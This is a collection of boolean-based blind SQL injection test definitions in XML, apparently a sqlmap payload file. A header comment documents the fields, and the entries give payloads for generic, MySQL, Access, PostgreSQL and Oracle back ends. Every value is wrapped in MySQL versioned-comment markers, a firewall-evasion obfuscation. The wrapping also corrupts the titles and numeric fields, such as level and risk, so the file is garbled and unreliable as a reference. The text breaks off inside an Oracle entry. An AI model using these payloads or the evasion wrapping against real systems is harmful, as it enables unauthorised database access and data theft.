
<!--
Tag: <test>
    SQL injection test definition.

    Sub-tag: <title>
        Title of the test.

    Sub-tag: <stype>
        SQL injection family type.

        Valid values:
            1: Boolean-based blind SQL injection
            2: Error-based queries SQL injection
            3: Inline queries SQL injection
            4: Stacked queries SQL injection
            5: Time-based blind SQL injection
            6: UNION query SQL injection

    Sub-tag: <level>
        From which level check for this test.

        Valid values:
            1: Always (<100 requests)
            2: Try a bit harder (100-200 requests)
            3: Good number of requests (200-500 requests)
            4: Extensive test (500-1000 requests)
            5: You have plenty of time (>1000 requests)

    Sub-tag: <risk>
        Likelihood of a payload to damage the data integrity.

        Valid values:
            1: Low risk
            2: Medium risk
            3: High risk

    Sub-tag: <clause>
        In which clause the payload can work.

        NOTE: for instance, there are some payload that do not have to be
        tested as soon as it has been identified whether or not the
        injection is within a WHERE clause condition.

        Valid values:
            0: Always
            1: WHERE / HAVING
            2: GROUP BY
            3: ORDER BY
            4: LIMIT
            5: OFFSET
            6: TOP
            7: Table name
            8: Column name
            9: Pre-WHERE (non-query)

        A comma separated list of these values is also possible.

    Sub-tag: <where>
        Where to add our '<prefix> <payload><comment> <suffix>' string.

        Valid values:
            1: Append the string to the parameter original value
            2: Replace the parameter original value with a negative random
               integer value and append our string
            3: Replace the parameter original value with our string

    Sub-tag: <vector>
        The payload that will be used to exploit the injection point.

    Sub-tag: <request>
        What to inject for this test.

        Sub-tag: <payload>
            The payload to test for.

        Sub-tag: <comment>
            Comment to append to the payload, before the suffix.

        Sub-tag: <char>
            Character to use to bruteforce number of columns in UNION
            query SQL injection tests.

        Sub-tag: <columns>
            Range of columns to test for in UNION query SQL injection
            tests.

    Sub-tag: <response>
        How to identify if the injected payload succeeded.

        Sub-tag: <comparison>
            Perform a request with this string as the payload and compare
            the response with the <payload> response. Apply the comparison
            algorithm.

            NOTE: useful to test for boolean-based blind SQL injections.

        Sub-tag: <grep>
            Regular expression to grep for in the response body.

            NOTE: useful to test for error-based SQL injection.

        Sub-tag: <time>
            Time in seconds to wait before the response is returned.

            NOTE: useful to test for time-based blind and stacked queries
            SQL injections.

        Sub-tag: <union>
            Calls unionTest() function.

            NOTE: useful to test for UNION query (inband) SQL injection.

    Sub-tag: <details>
        Which details can be infered if the payload succeed.

        Sub-tags: <dbms>
            What is the database management system (e.g. MySQL).

        Sub-tags: <dbms_version>
            What is the database management system version (e.g. 5.0.51).

        Sub-tags: <os>
            What is the database management system underlying operating
            system.

    <test>
        <title></title>
        <stype></stype>
        <level></level>
        <risk></risk>
        <clause></clause>
        <where></where>
        <vector></vector>
        <request>
            <payload></payload>
            <comment></comment>
            <char></char>
            <columns></columns>
        </request>
        <response>
            <comparison></comparison>
            <grep></grep>
            <time></time>
            <union></union>
        </response>
        <details>
            <dbms></dbms>
            <dbms_version></dbms_version>
            <os></os>
        </details>
    </test>
-->

<root>
    
    <test>
        <title>/*!50000AND boolean-based blind - WHERE or HAVING clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500001/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,8,9/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500001/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001,9/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (NOT)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001,9/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000OR NOT/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR NOT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR NOT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000AND boolean-based blind - WHERE or HAVING clause (subquery - comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,8,9/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</payload>
            <comment>/*!50000[GENERIC_SQL_COMMENT]/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (subquery - comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001,9/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</payload>
            <comment>/*!50000[GENERIC_SQL_COMMENT]/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000AND boolean-based blind - WHERE or HAVING clause (comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000[GENERIC_SQL_COMMENT]/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000[GENERIC_SQL_COMMENT]/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (NOT - comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000OR NOT/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR NOT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000[GENERIC_SQL_COMMENT]/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR NOT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000AND boolean-based blind - WHERE or HAVING clause (MySQL comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000#/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (MySQL comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000#/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000OR NOT/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR NOT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000#/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR NOT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000%16/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
            <comment>/*!50000%16/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000RLIKE (SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 0x28 END))/**_**/*/</vector>
        <request>
            <payload>/*!50000RLIKE (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 0x28 END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000RLIKE (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 0x28 END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3,8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND MAKE_SET(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000AND MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR MAKE_SET(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000OR MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3,8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND ELT(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000AND ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR ELT(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000OR ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3,8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND EXTRACTVALUE(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 0x3A END)/**_**/*/</vector>
        <request>
            <payload>/*!50000AND EXTRACTVALUE(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 0x3A END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND EXTRACTVALUE(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 0x3A END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001,2,3,8/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR EXTRACTVALUE(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 0x3A END)/**_**/*/</vector>
        <request>
            <payload>/*!50000OR EXTRACTVALUE(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 0x3A END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR EXTRACTVALUE(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 0x3A END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND (SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN NULL ELSE CAST('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000' AS NUMERIC) END)) IS NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000AND (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN NULL ELSE CAST('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000' AS NUMERIC) END)) IS NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN NULL ELSE CAST('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000' AS NUMERIC) END)) IS NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR (SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN NULL ELSE CAST('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000' AS NUMERIC) END)) IS NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000OR (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN NULL ELSE CAST('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000' AS NUMERIC) END)) IS NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN NULL ELSE CAST('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000' AS NUMERIC) END)) IS NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND (SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) END) FROM DUAL) IS NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000AND (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) END) FROM DUAL) IS NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) END) FROM DUAL) IS NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR (SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) END) FROM DUAL) IS NULL/**_**/*/</vector>
        <request>
